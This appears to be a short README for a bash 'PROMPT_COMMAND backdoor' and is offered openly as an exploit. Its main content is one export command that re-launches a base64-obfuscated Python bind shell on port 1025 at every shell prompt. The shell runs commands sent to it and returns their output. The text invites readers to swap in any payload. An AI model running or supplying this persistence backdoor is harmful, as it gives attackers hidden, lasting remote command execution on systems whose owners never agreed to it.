PROMPT_COMMAND "backdoor"
======================

"*...If set, the value is executed as a command prior to issuing each primary prompt...*"

**Video**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=lM10kYBoKtg" target="_blank"><img src="http://img.youtube.com/vi/lM10kYBoKtg/0.jpg" alt="Profit with Git hooks!" width="480" height="360" border="10" /></a>

**Exploit**
```shell-session

export PROMPT_COMMAND="lsof -i:1025 &>/dev/null || (python -c \"exec('aW1wb3J0IHNvY2tldCxvcyxzeXMKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgiIiwxMDI1KSkKcy5saXN0ZW4oMSkKKGMsYSk9cy5hY2NlcHQoKQp3aGlsZSAxOgogZD1jLnJlY3YoNTEyKQogaWYgJ2V4aXQnIGluIGQ6CiAgcy5jbG9zZSgpCiAgc3lzLmV4aXQoMCkKIHI9b3MucG9wZW4oZCkucmVhZCgpCiBjLnNlbmQocikK'.decode('base64'))\" 2>/dev/null &)"

```

You can use whatever payload you want to exploit! Free your mind Neo! ;-)

